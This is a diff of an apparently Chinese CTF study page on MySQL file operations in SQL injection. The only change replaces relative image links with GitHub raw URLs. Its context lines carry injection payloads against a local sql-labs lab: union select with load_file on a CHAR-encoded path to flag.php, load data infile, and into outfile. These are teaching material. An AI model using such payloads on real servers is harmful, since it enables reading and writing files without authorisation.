@@ -13,7 +13,7 @@ union select 1,1,load_file(CHAR(72, 58, 92, 87, 87, 87, 92, 102,
 
 注:CHAR(72, 58, 92, 87, 87, 87, 92, 102, 108, 97, 103, 46, 112, 104, 112)="H:\WWW\flag.php"
 
-![](images/66B3876071A44D67943EA06F9366267Fclipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/mysql注入语法基础/mysql文件操作/images/66B3876071A44D67943EA06F9366267Fclipboard.png)
 
 
 
@@ -27,7 +27,7 @@ load data infile FILE_PATH into table TABLE_NAME(COLUMN_NAME)
 
 将flag.php文件中的内容读取到users表username字段中。
 
-![](images/758545ECEA954996A4CA06CE0C45D5F1clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/mysql注入语法基础/mysql文件操作/images/758545ECEA954996A4CA06CE0C45D5F1clipboard.png)
 
 
 
@@ -49,7 +49,7 @@ http://127.0.0.1/sql-labs/Less-7/?id=1'))union select 1,2,version() into outfile
 
 
 
-![](images/376000C493934BB5A20D21CF49E927D5clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/mysql注入语法基础/mysql文件操作/images/376000C493934BB5A20D21CF49E927D5clipboard.png)
 
 
 
@@ -65,5 +65,5 @@ http://127.0.0.1/sql-labs/Less-7/?id=1'))union select 1,2,
 
 
 
-![](images/FF5EF44BCD1848CE84469385A7DCC1A0clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/mysql注入语法基础/mysql文件操作/images/FF5EF44BCD1848CE84469385A7DCC1A0clipboard.png)
 
